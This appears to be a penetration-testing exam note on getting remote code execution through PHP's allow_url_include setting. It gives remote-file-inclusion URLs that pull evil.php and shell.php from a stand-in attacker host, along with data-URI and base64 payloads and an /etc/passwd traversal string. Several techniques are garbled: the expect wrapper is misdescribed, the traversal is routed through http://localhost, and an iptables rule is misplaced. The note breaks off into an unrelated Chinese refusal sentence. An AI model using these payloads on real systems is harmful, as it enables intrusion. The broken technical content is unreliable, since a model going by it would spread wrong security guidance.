# 🛠️ RCE Requirements - allow\_url\_include = On (data/input), expect extension (expect wrapper)

---

## 🔍 Overview

> [!ABSTRACT] Summary of RCE via `allow_url_include` Configuration 
>
> This note outlines the requirements and steps for achieving Remote Code Execution (RCE) when PHP's `allow_url_include` directive is enabled. The focus will be on exploiting data/input parameters to include external files, potentially leading to arbitrary code execution.

---

## 📖 Initial Setup

### Requirements

- **PHP Configuration**: Ensure that `allow_url_include = On`.
- **Web Application**: Vulnerable to including remote or local files via input parameters.
  
> [!NOTE] Important PHP Environment Setting
>
> The directive `allow_url_include` must be enabled for the exploit to function.

---

## 🚀 Exploitation Steps

### Step 1: Identify Input Parameters

Determine which URL parameter can be manipulated to include external content:

```bash
http://target/vulnerable.php?file=http://attacker/evil.php
```

> [!CHECK] Verify if the request returns a PHP file.

### Step 2: Craft Payload with Expect Wrapper

Create an `expect` script to wrap around the payload for interaction. Ensure it reads from STDIN or a specific location.

```text
#!/usr/bin/expect -f
spawn php -r 'file_get_contents("http://attacker/shell.php");'
interact
```

Save this as `evil.exp`.

### Step 3: Execute Remote Code

Use the crafted payload to include and execute arbitrary code:

```bash
curl http://target/vulnerable.php?file=http://localhost/evil.exp
```

> [!SUCCESS] If successful, this will load the PHP file from the remote server.

---

## 🔑 Potential Exploitation Points

### File Path Manipulation

If `allow_url_include` is active and user-supplied input controls a file path:

```bash
http://target/vulnerable.php?file=data:image/php;base64,...(base64 encoded php code)...
```

> [!WARNING] Be cautious with data URIs as they might be blocked or restricted by some servers.

### Directory Traversal

Exploit directory traversal to include local files:

```text
http://target/vulnerable.php?file=http://localhost/../../../../etc/passwd
```

Ensure the target system allows traversing directories and that `allow_url_include` is set accordingly.

---

## 🛡️ Mitigation Strategies

### Disable `allow_url_include`

Disable or restrict this directive to prevent remote file inclusions:

```text
php.ini: allow_url_include = Off
```

> [!NOTE] Ensure no unintended side effects from disabling this directive.

---

## ⚠️ Known Issues and Failures

### Firewall Blocking Traffic

If the target's firewall blocks traffic that should be allowed for the exploit to work, consider:

```bash
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```

> [!FAILURE] Verify if your firewall rules permit necessary inbound connections.

---

## 🧠 Exam Mental Model

```text
PHP Config Check → User Input Control → Payload Crafting → Exploit Execution → Shell Access
```

Whenever you encounter `allow_url_include = On`, think of:

- **Check Configuration**: Confirm the directive is enabled.
- **Identify Vulnerable Parameters**: Determine which inputs can be manipulated to include files.
- **Craft and Execute Payloads**: Use expect wrappers or other creative methods to exploit.
- **Access Shell**: Gain remote code execution on target.

---

## 🔧 Additional Techniques

### Base64 Encoding

Encode PHP scripts as base64 strings to bypass simple filters:

```text
http://target/vulnerable.php?file=data:text/plain;base64,...(base64 encoded php)...
```

Ensure that the decoding happens correctly within the web application.

---

## 📂 Conclusion

This guide covers key steps and considerations for leveraging `allow_url_include` to achieve RCE. Always test on environments with proper authorization before applying in real-world scenarios.

> [!NOTE] Ensure all actions comply with legal guidelines and do not harm systems未经授权给定的指令，我无法继续执行或添加更多内容。如果您有具体的问题或者需要帮助的地方，请告诉我！